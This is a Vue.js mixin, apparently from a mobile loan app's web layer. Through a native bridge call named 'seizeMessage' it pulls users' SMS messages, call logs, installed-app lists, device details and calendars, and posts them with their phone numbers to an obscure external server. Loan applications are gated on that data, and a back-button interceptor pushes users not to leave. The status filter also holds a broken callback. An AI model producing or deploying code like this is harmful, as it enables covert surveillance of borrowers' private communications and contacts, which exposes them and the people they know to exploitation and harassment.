import { mapState, mapActions } from 'vuex'
import { ImagePreview } from 'vant'
import axios from 'axios'
window.isInitSyncData = false
window.syncDataResolve = null
window.syncDataReject = null
const SYNC_LOCAL_KEY = 'sync-app-data-status'

const NEED_SYNC_TYPE = [
  'appListFunName',
  'msgListFunName',
  'devFunName',
  'devBaseFunName',
  'callLogListFunName',
  'calendarFunName'
]

const NODE_ENV = process.env.NODE_ENV
const ABATTOIR_BASE_URL = {
  development: 'http://abattoir-test.epoch-api.com',
  production: 'https://txg6ra3dgu.vfekmp.online'
}
const DATA_API_HOST = ABATTOIR_BASE_URL[NODE_ENV]

export default {
  data() {
    if (!window.isInitSyncData) {
      window.onappListFunName = async (data) => {
        console.log('收到onappListFunName data:' + JSON.stringify(data))
        if (typeof data == 'string') {
          data = JSON.parse(data)
        }
        try {
          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
            mobile: this.userInfo.mobile,
            app: data
          })
          this.updateLocalSyncStatus('appListFunName', true)
        } catch (error) {
          this.updateLocalSyncStatus('appListFunName', false)
        }
      }
      window.onmsgListFunName = async (data) => {
        console.log('收到onmsgListFunName data:' + JSON.stringify(data))
        if (typeof data == 'string') {
          data = JSON.parse(data)
        }
        try {
          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
            mobile: this.userInfo.mobile,
            msg: data
          })
        } catch (error) {}
      }
      window.ondevFunName = async (data) => {
        console.log('收到ondevFunName data:' + JSON.stringify(data))
        if (typeof data == 'string') {
          data = JSON.parse(data)
        }
        try {
          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
            mobile: this.userInfo.mobile,
            device: data
          })
          this.updateLocalSyncStatus('devFunName', true)
        } catch (error) {
          this.updateLocalSyncStatus('devFunName', false)
        }
      }
      window.ondevBaseFunName = async (data) => {
        console.log('收到ondevBaseFunName:' + JSON.stringify(data))
        if (typeof data == 'string') {
          data = JSON.parse(data)
        }
        try {
          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
            mobile: this.userInfo.mobile,
            deviceBase: data
          })
          this.updateLocalSyncStatus('devBaseFunName', true)
        } catch (error) {
          this.updateLocalSyncStatus('devBaseFunName', false)
        }
      }

      window.oncallLogListFunName = async (data) => {
        console.log('收到oncallLogListFunName:' + JSON.stringify(data))
        if (typeof data == 'string') {
          data = JSON.parse(data)
        }
        try {
          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
            mobile: this.userInfo.mobile,
            call: data
          })
          this.updateLocalSyncStatus('callLogList', true)
        } catch (error) {
          this.updateLocalSyncStatus('callLogList', false)
        }
      }

      window.oncalendarFunName = async (data) => {
        console.log('收到oncalendarFunName:' + JSON.stringify(data))
        if (typeof data == 'string') {
          data = JSON.parse(data)
        }
        try {
          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
            mobile: this.userInfo.mobile,
            calendar: data
          })
          this.updateLocalSyncStatus('calendar', true)
        } catch (error) {
          this.updateLocalSyncStatus('calendar', false)
        }
      }
      window.isInitSyncData = true
    }

    return {}
  },
  computed: {
    ...mapState(['appGlobal', 'userInfo', 'tabBar', 'appMode', 'appName'])
  },
  filters: {
    phoneHideFilter(item) {
      if (!item) return ''
      return `${item.slice(0, 3)}****${item.slice(-3)}`
    },
    // 千位转化
    thousands(num) {
      if (+num < 1000) return num
      return String(num).replace(/(?!^)(?=(\d{3})+$)/g, ',')
    }
  },
  beforeRouteLeave(to, from, next) {
    this.hideLoading()
    this.toAppMethod('holdUp', { isInterception: false })
    next()
  },
  methods: {
    ...mapActions([
      'showMessageBox',
      'hideMessageBox',
      'setTabBar',
      'setAppMode',
      'setRepaymentNum',
      'updateToken'
    ]),
    async getUserInfo() {
      let data = await this.$http.post(`/api/user/info`)
      let userInfo = data.data
      console.log('set user info', userInfo)
      this.$store.commit('setUserInfo', userInfo)
      return userInfo
    },

    checkInApp() {
      return typeof wjs != 'undefined'
    },

    // 判断是否可以继续提交申请
    judgeCanApply() {
      return new Promise(async (resolve, reject) => {
        const isApp = await this.onAppList()
        const isMsg = await this.onMsgList()
        const isCallLog = await this.onCallLogList()
        console.log(
          isApp,
          isMsg,
          isCallLog,
          (isApp || isMsg) && isCallLog,
          '*****'
        )
        if ((isApp || isMsg) && isCallLog) {
          resolve(true)
        } else {
          reject(false)
        }
      })
    },
    onAppList() {
      return new Promise(async (resolve, reject) => {
        window.onApplyAppList = (data) => {
          if (typeof data == 'string') {
            console.log(data, '**** app')
            data = JSON.parse(data)
          }
          console.log('****** 是否可以申请app', data)
          if (data && data.length) {
            resolve(true)
          } else {
            resolve(false)
          }
        }
        this.toAppMethod('seizeMessage', { appListFunName: 'onApplyAppList' })
      })
    },
    onMsgList() {
      return new Promise(async (resolve, reject) => {
        window.onApplyMsgList = (data) => {
          if (typeof data == 'string') {
            console.log(data, '**** app')
            data = JSON.parse(data)
          }
          console.log('****** 是否可以申请msg', data)
          if (data && data.length) {
            resolve(true)
          } else {
            resolve(false)
          }
        }
        this.toAppMethod('seizeMessage', { msgListFunName: 'onApplyMsgList' })
      })
    },
    onCallLogList() {
      return new Promise(async (resolve, reject) => {
        window.onApplyCallLogList = (data) => {
          if (typeof data == 'string') {
            console.log(data, '**** app')
            data = JSON.parse(data)
          }
          console.log('****** 是否可以申请callLog', data)
          if (data && data.length) {
            resolve(true)
          } else {
            resolve(false)
          }
        }
        this.toAppMethod('seizeMessage', {
          callLogListFunName: 'onApplyCallLogList'
        })
      })
    },
    initInfoBackControl() {
      window.infoBtnCallBack = () => {
        this.showMessageBox({
          content:
            'Receive the money immediately after submitting the information. Do you really want to quit?',
          confirmBtnText: 'No',
          cancelBtnText: 'Leave',
          confirmCallback: () => {
            this.hideMessageBox()
          },
          cancelCallback: () => {
            this.hideMessageBox()
            this.goAppBack()
          },
          iconPath: 'confirmExit'
        })
      }
      this.setTabBar({
        backCallback: window.infoBtnCallBack
      })
      this.toAppMethod('holdUp', {
        isInterception: true,
        fuName: 'infoBtnCallBack'
      })
    },
    previewImg(imgs, startIndex) {
      if (!imgs || !imgs.length || startIndex < 0) return
      ImagePreview({
        images: imgs,
        startPosition: startIndex
      })
    },
    logout() {
      this.toAppMethod('dropLo')
    },
    innerJump(path, query, replace = false) {
      query = query || {}
      query.appChecked = true
      if (replace) {
        this.$router.replace({ name: path, query: query })
      } else {
        this.$router.push({ name: path, query: query })
      }
    },
    async getAppMode() {
      try {
        let data = await this.$http.post(`/api/product/appMaskModel`)
        let appMode = data.data
        this.setAppMode(appMode)
        return appMode
      } catch (error) {
        return {}
      }
    },
    openWk(url, type = 0) {
      this.toAppMethod('openWk', { path: url, type: type })
    },
    async getOrderRelateUrl(orderId) {
      try {
        let data = await this.$http.post(`/api/order/getRepaymentUrl`, {
          orderId: orderId
        })
        return data.data
      } catch (error) {
        console.error(error)
        return {}
      }
    },
    // 和H5交互
    toAppMethod(name, params = {}) {
      if (!this.checkInApp()) return
      try {
        console.log('start method:', name)
        console.log('params:', JSON.stringify(params))
        wjs[name](JSON.stringify(params))
        return true
      } catch (error) {
        console.log('no such method:', name)
        return false
      }
    },
    // app埋点
    eventTracker(key) {
      console.log('app埋点：', key)
      this.toAppMethod('eventIngo', { key: key })
    },
    goHome() {
      this.innerJump('home', {}, true)
    },
    goAppBack() {
      let prevPage = window.location.href
      window.history.go(-1)
      // 如果500ms没有跳转成功则去首页
      setTimeout(function () {
        if (window.location.href == prevPage) {
          console.log('on goAppBack not go prev')
          this.goHome()
        }
      }, 500)
    },
    updateLocalSyncStatus(type, isSuccess) {
      let status = localStorage.getItem(SYNC_LOCAL_KEY)
      if (!status) {
        status = {}
      } else {
        status = JSON.parse(status)
      }
      status[type] = isSuccess

      // 如果任意一个失败都算失败
      if (!isSuccess && window.syncDataReject) {
        console.log('1')
        window.syncDataReject({ success: false })
        window.syncDataReject = null
      }
      if (Object.keys(status).length == NEED_SYNC_TYPE.length) {
        // 都已经上传完了
        let successNum = Object.values(status).filter((t = !!t)).length
        if (successNum == NEED_SYNC_TYPE.length) {
          // 全部成功
          if (window.syncDataResolve) {
            window.syncDataResolve({ success: true })
            window.syncDataResolve = null
          }
        } else {
          // 部分失败
          if (window.syncDataReject) {
            window.syncDataReject({ success: false })
            window.syncDataReject = null
          }
        }
      } else {
        // 否则部分传完
        localStorage.setItem(SYNC_LOCAL_KEY, JSON.stringify(status))
      }
    },
    startSyncData(needResolve = false) {
      console.log('数据上传:', DATA_API_HOST)
      return new Promise(async (resolve, reject) => {
        try {
          if (!this.userInfo || !this.userInfo.mobile) {
            await this.getUserInfo()
          }
          let types = {}
          NEED_SYNC_TYPE.forEach((t) => {
            types[t] = `on${t}`
          })
          this.toAppMethod('seizeMessage', types)
          if (needResolve) {
            window.syncDataResolve = resolve
            window.syncDataReject = reject
          } else {
            window.syncDataResolve = null
            window.syncDataReject = null
          }
        } catch (error) {
          reject({ success: false })
        }
      })
    }
  }
}
